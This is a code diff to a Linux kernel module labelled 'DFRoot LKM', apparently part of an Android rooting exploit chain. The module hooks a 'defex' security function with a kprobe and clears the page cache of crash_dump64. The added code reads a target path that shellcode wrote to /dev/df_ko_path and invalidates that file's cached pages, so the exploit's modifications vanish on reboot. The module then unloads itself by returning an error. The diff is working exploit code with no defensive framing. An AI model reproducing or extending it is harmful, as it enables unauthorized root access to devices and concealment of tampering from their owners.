@@ -5,6 +5,8 @@
 #include <linux/module.h>
 #include <linux/namei.h>
 #include <linux/ptrace.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("DFRoot LKM");
@@ -32,6 +34,27 @@ static void drop_path_cache(kern_path_t kern_path_fn, invalidate_t invalidate_fn
     invalidate_fn(p.dentry->d_inode->i_mapping);
     path_put_fn(&p);
     pr_info("dfroot: cleared page cache for %s\n", path);
+}
+
+/* Read the KO target path written by the shellcode. */
+static int read_ko_path(char *buf, size_t buf_size)
+{
+    struct file *f;
+    loff_t pos = 0;
+    ssize_t n;
+
+    f = filp_open("/dev/df_ko_path", O_RDONLY, 0);
+    if (IS_ERR(f))
+        return -PTR_ERR(f);
+    n = kernel_read(f, buf, buf_size - 1, &pos);
+    filp_close(f, NULL);
+    if (n <= 0)
+        return -1;
+    buf[n] = '\0';
+    /* strip trailing newline */
+    if (n > 0 && buf[n - 1] == '\n')
+        buf[--n] = '\0';
+    return 0;
 }
 
 static int defex_pre_handler(struct kprobe *p, struct pt_regs *regs)
@@ -128,6 +151,16 @@ static int __nocfi __init dirtyfrag_init(void)
     path_put_fn   = (path_put_t)  get_addr("path_put");
     drop_path_cache(kern_path_fn, invalidate_fn, path_put_fn,
                     "/apex/com.android.runtime/bin/crash_dump64");
+
+    /* Invalidate the KO target file's page cache so a full reboot
+     * restores the original library content. */
+    {
+        char ko_path[128] = {0};
+        if (read_ko_path(ko_path, sizeof(ko_path)) == 0 && ko_path[0]) {
+            pr_info("dfroot: invalidating KO target %s\n", ko_path);
+            drop_path_cache(kern_path_fn, invalidate_fn, path_put_fn, ko_path);
+        }
+    }
 
     return -E2BIG; /* return any error to unload module */
 }
